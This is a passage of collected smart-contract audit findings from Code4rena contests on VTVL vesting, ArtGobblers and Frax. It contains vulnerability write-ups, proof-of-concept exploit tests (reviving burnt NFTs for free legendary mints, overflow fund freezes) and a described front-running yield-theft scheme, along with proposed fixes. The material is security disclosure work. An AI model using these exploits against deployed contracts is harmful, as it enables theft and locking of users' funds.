[terminationTimestamp]);      let userBalanceBefore = await tokenContract.balanceOf(owner2.address);     await (await vestingContract.connect(owner2).withdraw()).wait();     let userBalanceAfter = await tokenContract.balanceOf(owner2.address);      // revoke the claim preserving the \"already vested but not yet withdrawn amount\"     await (await vestingContract.revokeClaim(owner2.address)).wait();          // move the clock to the programmed end of vesting period     await ethers.provider.send(\"evm_mine\", [endTimestamp]);      console.log(userBalanceAfter.sub(userBalanceBefore));     // RESIGNING EMPLOYEE RECEIVES HIS VESTED AMOUNT BY WITHDRAWING IMMEDIATELY BEFORE RESIGNATION     expect(userBalanceAfter.sub(userBalanceBefore)).to.be.greaterThan(0);     expect(await vestingContract.finalClaimableAmount(owner2.address)).to.be.equal(0);   }); ```solidity  ## Tools Used  n/a  ## Recommended Mitigation Steps  Below are, in order, a test and a diff/patch for a proposed fix. The proposed fix is just an idea at how to fix, or in other words, a way to preserve the already vested amount when claim is revoked.  The diff/patch add a deactivationTimestamp to claim, and a new revokeClaimProper that shall replace the revokeClaim function to correct the behaviour. The deactivationTimestamp is used to track the deactivation time for the claim in order to preserve the amount vested so far and allow the user to withdraw the amount righteously earned so far. The _baseVestedAmount and hasActiveClaim have been updated to do proper math when isActive is false but deactivationTimestamp is greater than 0.  The finalVestedAmount has been update to show the \"what would be\" amount if the vesting would have reached the claim endTimestamp while the finalClaimableAmount takes into consideration the deactivationTimestamp if the claim has been revoked.  The test shows that the already vested amount (cliff + half way linear vesting) is preserved.  ```solidity diff --git a/contracts/VTVLVesting.sol b/contracts/VTVLVesting.sol index 133f19f..7ab955c 100644 --- a/contracts/VTVLVesting.sol +++ b/contracts/VTVLVesting.sol @@ -34,6 +34,7 @@ contract VTVLVesting is Context, AccessProtected {          // Gives us a range from 1 Jan 1970 (Unix epoch) up to approximately 35 thousand years from then (2^40 / (365 * 24 * 60 * 60) ~= 35k)          uint40 startTimestamp; // When does the vesting start (40 bits is enough for TS)          uint40 endTimestamp; // When does the vesting end - the vesting goes linearly between the start and end timestamps +        uint40 deactivationTimestamp;          uint40 cliffReleaseTimestamp; // At which timestamp is the cliffAmount released. This must be <= startTimestamp          uint40 releaseIntervalSecs; // Every how many seconds does the vested amount increase.            @@ -108,7 +109,7 @@ contract VTVLVesting is Context, AccessProtected {            // We however still need the active check, since (due to the name of the function)          // we want to only allow active claims -        require(_claim.isActive == true, \"NO_ACTIVE_CLAIM\"); +        require(_claim.isActive == true || _claim.deactivationTimestamp > 0, \"NO_ACTIVE_CLAIM\");            // Save gas, omit further checks          // require(_claim.linearVestAmount + _claim.cliffAmount > 0, \"INVALID_VESTED_AMOUNT\"); @@ -144,20 +145,20 @@ contract VTVLVesting is Context, AccessProtected {      @param _claim The claim in question      @param _referenceTs Timestamp for which we're calculating       */ -    function _baseVestedAmount(Claim memory _claim, uint40 _referenceTs) internal pure returns (uint112) { +    function _baseVestedAmount(Claim memory _claim, uint40 _referenceTs, uint40 vestEndTimestamp) internal pure returns (uint112) {          uint112 vestAmt = 0; -         -        // the condition to have anything vested is to be active -        if(_claim.isActive) { +             +        if(_claim.isActive || _claim.deactivationTimestamp > 0) {              // no point of looking past the endTimestamp as nothing should vest afterwards              // So if we're past the end, just get the ref frame back to the end -            if(_referenceTs > _claim.endTimestamp) { -                _referenceTs = _claim.endTimestamp; +            if(_referenceTs > vestEndTimestamp) { +                _referenceTs = vestEndTimestamp;              }                // If we're past the cliffReleaseTimestamp, we release the cliffAmount              // We don't check here that cliffReleaseTimestamp is after the startTimestamp  -            if(_referenceTs >= _claim.cliffReleaseTimestamp) { // @audit is _claim.require(cliffReleaseTimestamp < _claim.endTimestamp) ? +            if(_referenceTs >= _claim.cliffReleaseTimestamp) {  // @audit note  cliffReleaseTimestamp cannot? be zero without cliffamoutn being zero +                // @audit NOTE: (cliffReleaseTimestamp is always <= _startTimestamp <= endTimestamp, or 0 if no vesting)                  vestAmt += _claim.cliffAmount;              }   @@ -195,7 +196,8 @@ contract VTVLVesting is Context, AccessProtected {      */      function vestedAmount(address _recipient, uint40 _referenceTs) public view returns (uint112) {          Claim storage _claim = claims[_recipient]; -        return _baseVestedAmount(_claim, _referenceTs); +        uint40 vestEndTimestamp = _claim.isActive ? _claim.endTimestamp : _claim.deactivationTimestamp; +        return _baseVestedAmount(_claim, _referenceTs, vestEndTimestamp);      }        /** @@ -205,7 +207,18 @@ contract VTVLVesting is Context, AccessProtected {       */      function finalVestedAmount(address _recipient) public view returns (uint112) {          Claim storage _claim = claims[_recipient]; -        return _baseVestedAmount(_claim, _claim.endTimestamp); +        return _baseVestedAmount(_claim, _claim.endTimestamp, _claim.endTimestamp); +    } + +    /** +    @notice Calculates how much wil be possible to claim at the end of vesting date, by subtracting the already withdrawn +            amount from the vestedAmount at this moment. Vesting date is either the end timestamp or the deactivation timestamp. +    @param _recipient - The address for whom we're calculating +    */ +    function finalClaimableAmount(address _recipient) external view returns (uint112) { +        Claim storage _claim = claims[_recipient]; +        uint40 vestEndTimestamp = _claim.isActive ? _claim.endTimestamp : _claim.deactivationTimestamp; +        return _baseVestedAmount(_claim, vestEndTimestamp, vestEndTimestamp) - _claim.amountWithdrawn;      }            /** @@ -214,7 +227,8 @@ contract VTVLVesting is Context, AccessProtected {      */      function claimableAmount(address _recipient) external view returns (uint112) {          Claim storage _claim = claims[_recipient]; -        return _baseVestedAmount(_claim, uint40(block.timestamp)) - _claim.amountWithdrawn; +        uint40 vestEndTimestamp = _claim.isActive ? _claim.endTimestamp : _claim.deactivationTimestamp; +        return _baseVestedAmount(_claim, uint40(block.timestamp), vestEndTimestamp) - _claim.amountWithdrawn;      }            /**  @@ -280,6 +294,7 @@ contract VTVLVesting is Context, AccessProtected {          Claim memory _claim = Claim({              startTimestamp: _startTimestamp,              endTimestamp: _endTimestamp, +            deactivationTimestamp: 0,              cliffReleaseTimestamp: _cliffReleaseTimestamp,              releaseIntervalSecs: _releaseIntervalSecs,              cliffAmount: _cliffAmount, @@ -436,6 +451,30 @@ contract VTVLVesting is Context, AccessProtected {          emit ClaimRevoked(_recipient, amountRemaining, uint40(block.timestamp), _claim);      }   +    function revokeClaimProper(address _recipient) external onlyAdmin hasActiveClaim(_recipient) { +        // Fetch the claim +        Claim storage _claim = claims[_recipient]; +        // Calculate what the claim should finally vest to +        uint112 finalVestAmt = finalVestedAmount(_recipient); + +        // No point in revoking something that has been fully consumed +        // so require that there be unconsumed amount +        require( _claim.amountWithdrawn < finalVestAmt, \"NO_UNVESTED_AMOUNT\"); + +        _claim.isActive = false; +        _claim.deactivationTimestamp = uint40(block.timestamp); + +        uint112 vestedSoFarAmt = vestedAmount(_recipient, uint40(block.timestamp)); +        // The amount that is \"reclaimed\" is equal to the total allocation less what was already +        // vested without the part that was already withdrawn. +        uint112 amountRemaining = finalVestAmt - (vestedSoFarAmt - _claim.amountWithdrawn); + +        numTokensReservedForVesting -= amountRemaining; // Reduces the allocation + +        // Tell everyone a claim has been revoked. +        emit ClaimRevoked(_recipient, amountRemaining, uint40(block.timestamp), _claim); +    } +      /**      @notice Withdraw a token which isn't controlled by the vesting contract.      @dev This contract controls/vests token at \"tokenAddress\". However, someone might send a different token.   ```"}, {"title": "Variable balance token causing fund lock and loss", "html_url": "https://github.com/code-423n4/2022-09-vtvl-findings/issues/278", "labels": ["bug", "enhancement", "2 (Med Risk)", "sponsor confirmed", "edited-by-warden"], "target": "2022-09-vtvl-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-vtvl/blob/f68b7f3e61dad0d873b5b5a1e8126b839afeab5f/contracts/VTVLVesting.sol#L295 https://github.com/code-423n4/2022-09-vtvl/blob/f68b7f3e61dad0d873b5b5a1e8126b839afeab5f/contracts/VTVLVesting.sol#L388   # Vulnerability details  ## Impact  Some ERC20 token's balance could change, one example is stETH. The balance could become insufficient at the time of `withdraw()`. User's fund will be locked due to DoS. The way to take the fund out is to send more token into the contract, causing fund loss to the protocol. And there is no guarantee that until the end time the balance would stay above the needed amount, the lock and loss issue persist.    ## Proof of Concept  For stETH like tokens, the `balanceOf()` value might go up or down, even without transfer. ```solidity // stETH     function balanceOf(address who) external override view returns (uint256) {         return _shareBalances[who].div(_sharesPerToken);     } ```  In `VTVLVesting`, the `require` check for the spot `balanceOf()` value will pass, but it is possible that as time goes on, the value become smaller and fail the transfer. As a result, the `withdraw()` call will revert, causing DoS, and lock user's fund. ```solidity // contracts/VTVLVesting.sol     function _createClaimUnchecked() private  hasNoClaim(_recipient) {         // ...         require(tokenAddress.balanceOf(address(this)) >= numTokensReservedForVesting + allocatedAmount, \"INSUFFICIENT_BALANCE\");         // ...     }      function withdraw() hasActiveClaim(_msgSender()) external {         // ...         tokenAddress.safeTransfer(_msgSender(), amountRemaining);         // ...     } ```   #### Reference https://etherscan.io/address/0x312ca0592a39a5fa5c87bb4f1da7b77544a91b87#code   ## Tools Used Manual analysis.  ## Recommended Mitigation Steps  Disallow such kind of variable balance token."}, {"title": "possible DoS on vestingRecipients due to lack of disposal mechanism", "html_url": "https://github.com/code-423n4/2022-09-vtvl-findings/issues/128", "labels": ["bug", "enhancement", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-vtvl-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-vtvl/blob/f68b7f3e61dad0d873b5b5a1e8126b839afeab5f/contracts/VTVLVesting.sol#L224 https://github.com/code-423n4/2022-09-vtvl/blob/f68b7f3e61dad0d873b5b5a1e8126b839afeab5f/contracts/VTVLVesting.sol#L245 https://github.com/code-423n4/2022-09-vtvl/blob/f68b7f3e61dad0d873b5b5a1e8126b839afeab5f/contracts/VTVLVesting.sol#L302 https://github.com/code-423n4/2022-09-vtvl/blob/f68b7f3e61dad0d873b5b5a1e8126b839afeab5f/contracts/VTVLVesting.sol#L317   # Vulnerability details  ## Impact - L224/245/302/317 - When the smart contracts start to be used, the variable in storage vestingRecipients will start to be filled with addresses, as there is no mechanism to eliminate elements, this will cause the allVestingRecipients() function to generate a DoS yes has many addressess.   ## Recommended Mitigation Steps In the withdraw() function you could remove the element from vestingRecipients that no longer has vesting. This would make the variable not grow without reducing elements. "}, {"title": "_baseVestedAmount() and vestedAmount() Return Incorrect Historical Values", "html_url": "https://github.com/code-423n4/2022-09-vtvl-findings/issues/104", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-vtvl-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-vtvl/blob/f68b7f3e61dad0d873b5b5a1e8126b839afeab5f/contracts/VTVLVesting.sol#L183-L187 https://github.com/code-423n4/2022-09-vtvl/blob/f68b7f3e61dad0d873b5b5a1e8126b839afeab5f/contracts/VTVLVesting.sol#L198   # Vulnerability details  ## Description As the comments in `_baseVestedAmount()` explain, once there is any `_claim.amountWithdrawn`, it will be returned if it is greater than the calculated value `vestAmt`. However, `vestAmt` takes account of time, `_referenceTs`, whereas `_claim.amountWithdrawn` is always the amount withdrawn to date. Therefore, for all historical values below `_claim.amountWithdrawn`, including timestamps before `_claim.startTimestamp` and before `_claim.cliffReleaseTimestamp`, `_claim.amountWithdrawn` will be returned.  ## Impact Given that VTVL is intended to be an accessible platform for use by a wide variety of users, this behaviour does create a security risk. Consider these scenarios: - A protocol relies on VTVL as an off-the-shelf solution for vesting, but builds other systems (escrow, NFT grants, access, airdrops) that work by checking the value of `vestedAmount()`. Airdrops are especially likely to be interested in historical values. These values would be distorted by how much users have claimed and so would result in an undesirable distribution of resources. - Even if the above does not occur, consider that VTVL might be passed over as a vesting solution precisely because its historical data is inaccurate. - A contract could be built that inherits from `VTVLVesting` and attempts to use `_baseVestedAmount()` (which is `internal` and so can be used by inheriting contracts). The inheriting contract might apportion rewards based on historical usage. - VTVL itself might wish to inherit from `VTVLVesting` in future.  ## Proof of Concept ```diff diff --git a/test/VTVLVesting.ts b/test/VTVLVestingPOC.ts index bb609fb..073e53f 100644 --- a/test/VTVLVesting.ts +++ b/test/VTVLVestingPOC.ts @@ -500,14 +500,37 @@ describe('Revoke Claim', async () => {    const recipientAddress = await randomAddress();    const [owner, owner2] = await ethers.getSigners();   -  it('allows admin to revoke a valid claim', async () => { +  it('POC: WITHDRAWN DATA IS UNRELIABLE', async () => {      const {vestingContract} = await createPrefundedVestingContract({tokenName, tokenSymbol, initialSupplyTokens}); -    await vestingContract.createClaim(recipientAddress, startTimestamp, endTimestamp, cliffReleaseTimestamp, releaseIntervalSecs, linearVestAmount, cliffAmount); +    const startTimestamp2 = startTimestamp.add(releaseIntervalSecs.mul(100)); +    const endTimestamp2 = endTimestamp.add(releaseIntervalSecs.mul(100)); +    const cliffReleaseTimestamp2 = cliffReleaseTimestamp.add(releaseIntervalSecs.mul(100)); +    await vestingContract.createClaim(owner2.address, startTimestamp2, endTimestamp2, cliffReleaseTimestamp2, releaseIntervalSecs, linearVestAmount, cliffAmount); + +    // Fast forward to middle of claim +    const halfWay = startTimestamp2.toNumber() + (endTimestamp2.toNumber()-startTimestamp2.toNumber())/2; +    await ethers.provider.send(\"evm_mine\", [halfWay]); + +    let vestAmt = await vestingContract.vestedAmount(owner2.address, startTimestamp); +    console.log(\"NO WITHDRAWAL, BEFORE VEST START: \",vestAmt.toString()); +    vestAmt = await vestingContract.vestedAmount(owner2.address, startTimestamp2); +    console.log(\"NO WITHDRAWAL, AT VEST START: \",vestAmt.toString()); +    vestAmt = await vestingContract.vestedAmount(owner2.address, halfWay); +    console.log(\"NO WITHDRAWAL, HALF WAY THROUGH VEST: \",vestAmt.toString()); +    vestAmt = await vestingContract.vestedAmount(owner2.address, endTimestamp2); +    console.log(\"NO WITHDRAWAL, AT VEST END: \",vestAmt.toString()); + +    await (await vestingContract.connect(owner2).withdraw()).wait();   -    (await vestingContract.revokeClaim(recipientAddress)).wait(); +    vestAmt = await vestingContract.vestedAmount(owner2.address, startTimestamp); +    console.log(\"WITHDRAWAL, BEFORE VEST START: \",vestAmt.toString()); +    vestAmt = await vestingContract.vestedAmount(owner2.address, startTimestamp2); +    console.log(\"WITHDRAWAL, AT VEST START: \",vestAmt.toString()); +    vestAmt = await vestingContract.vestedAmount(owner2.address, halfWay); +    console.log(\"WITHDRAWAL, HALF WAY THROUGH VEST: \",vestAmt.toString()); +    vestAmt = await vestingContract.vestedAmount(owner2.address, endTimestamp2); +    console.log(\"WITHDRAWAL, AT VEST END: \",vestAmt.toString());   -    // Make sure it gets reverted -    expect(await (await vestingContract.getClaim(recipientAddress)).isActive).to.be.equal(false);    });      it('prohibits a random user from revoking a valid claim', async () => { ```  ## Tools Used Manual Inspection  ## Recommended Mitigation Steps For active claims, there is no reason to consider `_claim.amountWithdrawn`, as it will always have been below or equal to `vestAmt` at any point in time. So only consider `vestAmt` for inactive claims. For them, return the lowest of `vestAmt` and  `_claim.amountWithdrawn`. This will keep the values monotonic with time without distorting the historical values. It will act as though `_claim.amountWithdrawn` was withdrawn and the claim was revoked in the block when `vestAmt` reached `_claim.amountWithdrawn`. That is a distortion, but it is required to provide monotonicity. "}, {"title": "Permanent freeze of vested tokens due to overflow in _baseVestedAmount", "html_url": "https://github.com/code-423n4/2022-09-vtvl-findings/issues/95", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-09-vtvl-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-vtvl/blob/f68b7f3e61dad0d873b5b5a1e8126b839afeab5f/contracts/VTVLVesting.sol#L176   # Vulnerability details  ## Description  The _baseVestedAmount() function calculates vested amount for some (claim, timestamp) pair. It is wrapped by several functions, like vestedAmount, which is used in withdraw() to calculate how much a user can retrieve from their claim. Therefore, it is critical that this function will calculate correctly for users to receive their funds.  Below is the calculation of the linear vest amount: ``` uint112 linearVestAmount = _claim.linearVestAmount * truncatedCurrentVestingDurationSecs / finalVestingDurationSecs; ``` Importantly, _claim.linearVestAmount is of type uint112 and truncatedCurrentVestingDurationSecs is of type uint40. Using compiler >= 0.8.0,  the product cannot exceed uint112 or else the function reverts due to overflow. In fact, we can show that uint112 is an inadequate size for this calculation.  The max value for uint112 is 5192296858534827628530496329220096.  Seconds in year = 3600 * 24 * 365 = 31536000  Tokens that inherit from ERC20 like the ones used in VTVL have 18 decimal places -> 1000000000000000000 This means the maximum number of tokens that are safe to vest for one year is 2**112 / 10e18 / (3600 * 24 * 365) = just 16,464,665 tokens.  This is definitely not a very large amount and it is expected that some projects will mint a similar or larger amount for vesting for founders / early employees. For 4 year vesting, the safe amount drops to 4,116,166. Projects that are not forewarned about this size limit are likely to suffer from freeze of funds of employees, which will require very patchy manual revocation and restructuring of the vesting to not overflow.  ## Impact Employees/founders do not have access to their vested tokens.  ## Proof of Concept Below is a test that demonstrates the overflow issue, 1 year after 17,000,000 tokens have matured. ``` describe('Long vest fail', async () => {   let vestingContract: VestingContractType;   // Default params   // linearly Vest 10000, every 1s, between TS 1000 and 2000   // additionally, cliff vests another 5000, at TS = 900   const recipientAddress = await randomAddress();   const startTimestamp = BigNumber.from(1000);   const endTimestamp = BigNumber.from(1000 + 3600 * 24 * 365);   const midTimestamp = BigNumber.from(1000 + (3600 * 24 * 365) / 2);   const cliffReleaseTimestamp = BigNumber.from(0);   const linearVestAmount = BigNumber.from('170000000000000000000000000');   const cliffAmount = BigNumber.from(0);   const releaseIntervalSecs = BigNumber.from(5);    before(async () => {     const {vestingContract: _vc} = await createPrefundedVestingContract({tokenName, tokenSymbol, initialSupplyTokens});     vestingContract = _vc;     await vestingContract.createClaim(recipientAddress, startTimestamp, endTimestamp, cliffReleaseTimestamp, releaseIntervalSecs, linearVestAmount, cliffAmount);   });    it('half term works', async() => {     expect(await vestingContract.vestedAmount(recipientAddress, midTimestamp)).to.be.equal('85000000000000000000000000');   });    it('full term fails', async() => {     // Note: at exactly the cliff time, linear vested amount won't yet come in play as we're only at second 0     await expect(vestingContract.vestedAmount(recipientAddress, endTimestamp)).to.be.revertedWithPanic(0x11     );   }); }); ```  ## Tools Used Manual audit, hardhat / chai.  ## Recommended Mitigation Steps Perform the intermediate calculation of linearVestAmount using the uint256 type. ``` uint112 linearVestAmount = uint112( uint256(_claim.linearVestAmount) * truncatedCurrentVestingDurationSecs / finalVestingDurationSecs); ``` "}, {"title": "Supply cap of VariableSupplyERC20Token is not properly enforced", "html_url": "https://github.com/code-423n4/2022-09-vtvl-findings/issues/3", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-vtvl-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-vtvl/blob/main/contracts/token/VariableSupplyERC20Token.sol#L36-L46   # Vulnerability details  ## Impact The admin of the token is not constrained to minting `maxSupply_`, they can mint any number of tokens.  ## Proof of Concept ```js // If we're using maxSupply, we need to make sure we respect it // mintableSupply = 0 means mint at will if(mintableSupply > 0) {  require(amount <= mintableSupply, \"INVALID_AMOUNT\");  // We need to reduce the amount only if we're using the limit, if not just leave it be  mintableSupply -= amount; } ``` The logic is as follows: if the amount that can be minted is zero, treat this as an infinite mint. Else require that the minted amount is not larger than mintable supply.  One can note that it is possible to mint all mintable supply. Then the mintable supply will be `0` which will be interpreted as infinity and any number of tokens will be possible to be minted.  ## Tools Used Manual analysis  ## Recommended Mitigation Steps Treat `2 ** 256 - 1` as infinity instead of `0`. "}, {"title": "Wrong balanceOf user after minting legendary gobbler", "html_url": "https://github.com/code-423n4/2022-09-artgobblers-findings/issues/333", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "old-submission-method", "selected for report"], "target": "2022-09-artgobblers-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-artgobblers/blob/d2087c5a8a6a4f1b9784520e7fe75afa3a9cbdbe/src/ArtGobblers.sol#L458   # Vulnerability details  ## Impact  In `ArtGobblers.mintLegendaryGobbler()` function, line 458 calculates the number of gobblers user owned after minting ```solidity // We subtract the amount of gobblers burned, and then add 1 to factor in the new legendary. getUserData[msg.sender].gobblersOwned = uint32(getUserData[msg.sender].gobblersOwned - cost + 1); ```  It added 1 to factor in the new legendary. But actually, this new legendary is accounted in `_mint()` function already ```solidity function _mint(address to, uint256 id) internal {     // Does not check if the token was already minted or the recipient is address(0)     // because ArtGobblers.sol manages its ids in such a way that it ensures it won't     // double mint and will only mint to safe addresses or msg.sender who cannot be zero.      unchecked {         ++getUserData[to].gobblersOwned;     }      getGobblerData[id].owner = to;      emit Transfer(address(0), to, id); } ```  So the result is `gobblersOwned` is updated incorrectly. And `balanceOf()` will return wrong value.   ## Proof of Concept  Script modified from `testMintLegendaryGobbler()` ```solidity function testMintLegendaryGobbler() public {     uint256 startTime = block.timestamp + 30 days;     vm.warp(startTime);     // Mint full interval to kick off first auction.     mintGobblerToAddress(users[0], gobblers.LEGENDARY_AUCTION_INTERVAL());     uint256 cost = gobblers.legendaryGobblerPrice();     assertEq(cost, 69);     setRandomnessAndReveal(cost, \"seed\");     uint256 emissionMultipleSum;     for (uint256 curId = 1; curId <= cost; curId++) {         ids.push(curId);         assertEq(gobblers.ownerOf(curId), users[0]);         emissionMultipleSum += gobblers.getGobblerEmissionMultiple(curId);     }      assertEq(gobblers.getUserEmissionMultiple(users[0]), emissionMultipleSum);      uint256 beforeSupply = gobblers.balanceOf(users[0]);     vm.prank(users[0]);     uint256 mintedLegendaryId = gobblers.mintLegendaryGobbler(ids);      // Check balance     assertEq(gobblers.balanceOf(users[0]), beforeSupply - cost + 1); } ```  ## Tools Used Foundry  ## Recommended Mitigation Steps Consider remove adding 1 when calculating `gobblersOwned` ```solidity getUserData[msg.sender].gobblersOwned = uint32(getUserData[msg.sender].gobblersOwned - cost); ```   "}, {"title": "Can Recover Gobblers Burnt In Legendary Mint", "html_url": "https://github.com/code-423n4/2022-09-artgobblers-findings/issues/219", "labels": ["bug", "3 (High Risk)", "primary issue", "sponsor confirmed", "selected for report"], "target": "2022-09-artgobblers-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-artgobblers/blob/d2087c5a8a6a4f1b9784520e7fe75afa3a9cbdbe/src/ArtGobblers.sol#L432 https://github.com/code-423n4/2022-09-artgobblers/blob/d2087c5a8a6a4f1b9784520e7fe75afa3a9cbdbe/src/ArtGobblers.sol#L890   # Vulnerability details  ## Impact Allows users to mint legendary Gobblers for free assuming they have the necessary amount of Gobblers to begin with. This is achieved by \"reviving\" sacrificed Gobblers after having called `mintLegendaryGobbler`.  ## Severity Justification This vulnerability allows the violation of the fundamental mechanics of in-scope contracts, allowing buyers to purchase legendary Gobblers at almost no cost outside of temporary liquidity requirements which can be reduced via the use of NFT flashloans.  ## Proof of Concept (PoC): Add the following code to the `ArtGobblersTest` contract in  `test/ArtGobblers.t.sol`  and run the test via `forge test --match-test testCanReuseSacrificedGobblers  -vvv`: ```solidity function testCanReuseSacrificedGobblers() public {  address user = users[0];   // setup legendary mint  uint256 startTime = block.timestamp + 30 days;  vm.warp(startTime);  mintGobblerToAddress(user, gobblers.LEGENDARY_AUCTION_INTERVAL());  uint256 cost = gobblers.legendaryGobblerPrice();  assertEq(cost, 69);  setRandomnessAndReveal(cost, \"seed\");   for (uint256 curId = 1; curId <= cost; curId++) {   ids.push(curId);   assertEq(gobblers.ownerOf(curId), users[0]);  }   // do token approvals for vulnerability exploit  vm.startPrank(user);  for (uint256 i = 0; i < ids.length; i++) {   gobblers.approve(user, ids[i]);  }  vm.stopPrank();   // mint legendary  vm.prank(user);  uint256 mintedLegendaryId = gobblers.mintLegendaryGobbler(ids);   // confirm user owns legendary  assertEq(gobblers.ownerOf(mintedLegendaryId), user);   // show that contract initially thinks tokens are burnt  for (uint256 i = 0; i < ids.length; i++) {   hevm.expectRevert(\"NOT_MINTED\");   gobblers.ownerOf(ids[i]);  }   // \"revive\" burnt tokens by transferring from zero address with approval  // which was not reset  vm.startPrank(user);  for (uint256 i = 0; i < ids.length; i++) {   gobblers.transferFrom(address(0), user, ids[i]);   assertEq(gobblers.ownerOf(ids[i]), user);  }  vm.stopPrank(); } ```  ## Tools Used Manual review.  ## Recommended Mitigation Steps Ensure token ownership is reset in the for-loop of the `mintLegendaryGobbler` method. Alternatively to reduce the gas cost of `mintLegendaryGobbler` by saving on the approval deletion, simply check the `from` address in `transferFrom`, revert if it's `address(0)`. Note that the latter version would also require changing the `getApproved` view method such that it checks the owner of the token and returns the zero-address if the owner is zero, otherwise the `getApproved` method would return the old owner after the underlying Gobbler was sacrificed. "}, {"title": "Rewards delay release could cause yields steal and loss", "html_url": "https://github.com/code-423n4/2022-09-frax-findings/issues/110", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "in discussion", "primary issue", "sponsor confirmed", "syncRewards sniping"], "target": "2022-09-frax-findings", "body": "# Lines of code  https://github.com/corddry/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/xERC4626.sol#L78-L97   # Vulnerability details  ## Impact  In the current rewards accounting, vault shares in `deposit()` and `redeem()` can not correctly record the spot yields generated by the staked asset. Yields are released over the next rewards cycle. As a result, malicious users can steal yields from innocent users by picking special timing to `deposit()` and `redeem()`.   ## Proof of Concept  In `syncRewards()`, the current asset balance is break into 2 parts: `storedTotalAssets` and `lastRewardAmount/nextRewards`. The `lastRewardAmount` is the surplus balance of the asset, or the most recent yields. ```solidity // lib/ERC4626/src/xERC4626.sol     function syncRewards() public virtual {         // ...          uint256 nextRewards = asset.balanceOf(address(this)) - storedTotalAssets_ - lastRewardAmount_;          storedTotalAssets = storedTotalAssets_ + lastRewardAmount_;          uint32 end = ((timestamp + rewardsCycleLength) / rewardsCycleLength) * rewardsCycleLength;          lastRewardAmount = nextRewards.safeCastTo192();         // ...                 rewardsCycleEnd = end;     } ```  And in the next rewards cycle, `lastRewardAmount` will be linearly added to `storedTotalAssets`, their sum is the return value of `totalAssets()`:  ```solidity     function totalAssets() public view override returns (uint256) {         // ...          if (block.timestamp >= rewardsCycleEnd_) {             // no rewards or rewards fully unlocked             // entire reward amount is available             return storedTotalAssets_ + lastRewardAmount_;         }          // rewards not fully unlocked         // add unlocked rewards to stored total         uint256 unlockedRewards = (lastRewardAmount_ * (block.timestamp - lastSync_)) / (rewardsCycleEnd_ - lastSync_);         return storedTotalAssets_ + unlockedRewards;     } ```  `totalAssets()` will be referred when `deposit()` and `redeem()`. ```solidity // lib/solmate/src/mixins/ERC4626.sol      function deposit(uint256 assets, address receiver) public virtual returns (uint256 shares) {         require((shares = previewDeposit(assets)) != 0, \"ZERO_SHARES\");         // ...         _mint(receiver, shares);         // ...     }      function redeem() public virtual returns (uint256 assets) {         // ...         require((assets = previewRedeem(shares)) != 0, \"ZERO_ASSETS\");          beforeWithdraw(assets, shares);          _burn(owner, shares);          // ...          asset.safeTransfer(receiver, assets);     }      function previewDeposit(uint256 assets) public view virtual returns (uint256) {         return convertToShares(assets);     }      function previewRedeem(uint256 shares) public view virtual returns (uint256) {         return convertToAssets(shares);     }      function convertToShares(uint256 assets) public view virtual returns (uint256) {         uint256 supply = totalSupply;           return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());     }      function convertToAssets(uint256 shares) public view virtual returns (uint256) {         uint256 supply = totalSupply;           return supply == 0 ? shares : shares.mulDivDown(totalAssets(), supply);     } ```  Based on the above rules, there are 2 potential abuse cases: 1. If withdraw just after the `rewardsCycleEnd` timestamp, a user can not get the yields from last rewards cycle. Since the `totalAssets()` only contain `storedTotalAssets` but not the yields part. It takes 1 rewards cycle to linearly add to the `storedTotalAssets`.   Assume per 10,000 asset staking generate yields of 70 for 7 days, and the reward cycle is 1 day. A malicious user Alice can do the following: - watch the mempool for  `withdraw(10,000)` from account Bob, front run it with `syncRewards()`, so that the most recent yields of amount 70 from Bob will stay in the vault.  - Alice will also deposit a 10,000 to take as much shares as possible.  - after 1 rewards cycle of 1 day, `redeem()` to take the yields of 70.   Effectively steal the yields from Bob. The profit for Alice is not 70, because after 1 day, her own deposit also generates some yield, in this example this portion is 1. At the end, Alice steal yield of amount 60.   2. When the Multisig Treasury transfers new yields into the vault, the new yields will accumulate until `syncRewards()` is called. It is possible that yields from multiple rewards cycles accumulates, and being released in the next cycle.  Knowing that the yields has been accumulated for 3 rewards cycles, a malicious user can `deposit()` and call `syncRewards()` to trigger the release of the rewards. `redeem()` after 1 cycle.  Here the malicious user gets yields of 3 cycles, lose 1 in the waiting cycle. The net profit is 2 cycle yields, and the gained yields should belong to the other users in the vault.    ## Tools Used Manual analysis.  ## Recommended Mitigation Steps   - for the `lastRewardAmount` not released, allow the users to redeem as it is linearly released later. - for the accumulated yields, only allow users to redeem the yields received after 1 rewards cycle after the deposit."}, {"title": "Frontrunning by malicious validator", "html_url": "https://github.com/code-423n4/2022-09-frax-findings/issues/81", "labels": ["bug", "3 (High Risk)", "sponsor acknowledged", "sponsor confirmed"], "target": "2022-09-frax-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-frax/blob/main/src/frxETHMinter.sol#L120   # Vulnerability details  ## Impact Frontrunning by malicious validator changing withdrawal credentials  ## Proof of Concept A malicious validator can frontrun depositEther transaction for its pubKey and deposit 1 ether for different withdrawal credential, thereby setting withdrawal credit before deposit of 32 ether by contract and thereby when 32 deposit ether are deposited, the withdrawal credential is also what was set before rather than the one being sent in depositEther transaction  ## Recommended Mitigation Steps Set withdrawal credentials for validator by depositing 1 ether with desired withdrawal credentials, before adding it in Operator Registry"}, {"title": "frxETHMinter.depositEther may run out of gas, leading to lost ETH", "html_url": "https://github.com/code-423n4/2022-09-frax-findings/issues/17", "labels": ["bug", "2 (Med Risk)", "in discussion", "primary issue", "sponsor confirmed", "depositEther OOG"], "target": "2022-09-frax-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-frax/blob/dc6684f77b4e9bd965e8862be7f5fb71473a4c4c/src/frxETHMinter.sol#L129   # Vulnerability details  ## Impact `frxETHMinter.depositEther` always iterates over all deposits that are possible with the current balance 